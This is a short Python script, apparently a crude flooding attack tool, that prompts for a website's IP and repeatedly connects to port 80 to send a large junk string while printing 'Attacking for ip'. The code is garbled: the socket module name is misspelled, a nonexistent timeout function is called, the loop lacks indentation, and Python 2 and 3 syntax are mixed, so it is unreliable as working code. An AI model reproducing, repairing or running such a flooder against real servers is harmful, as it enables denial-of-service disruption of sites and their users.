import scoket 
ip = input ( "Enter ip website: ")
while True :
sock = scoket.scoket(socket.AF_INET,scoket.SOCK_STREAM)
soket.setdefaulttime(1)
conn = sock.connect((ip,80))
data = "djjvfuijfdkbvfuijddjjbfykhf" *2000
sock.send (data)
print "Attacking for ip ",ip,"port 80"
